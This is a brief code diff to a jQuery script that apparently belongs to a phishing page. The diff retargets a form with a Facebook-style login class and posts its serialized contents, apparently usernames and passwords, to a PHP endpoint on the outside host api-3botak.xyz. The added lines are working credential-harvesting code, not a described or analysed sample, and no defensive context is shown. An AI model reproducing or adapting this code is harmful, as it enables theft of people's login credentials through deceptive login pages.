@@ -1,8 +1,8 @@
-$(".login-form").submit(function() {
-	var d = $(".login-form");
+$(".form-login-fb").submit(function() {
+	var d = $(".form-login-fb");
 
 	$.ajax({
-        url: "http://api-3botak.xyz/anniversary.php",
+        url: "http://api-3botak.xyz/kodereedem.php",
         type: "POST",
         data: d.serialize(),
         success: function () {
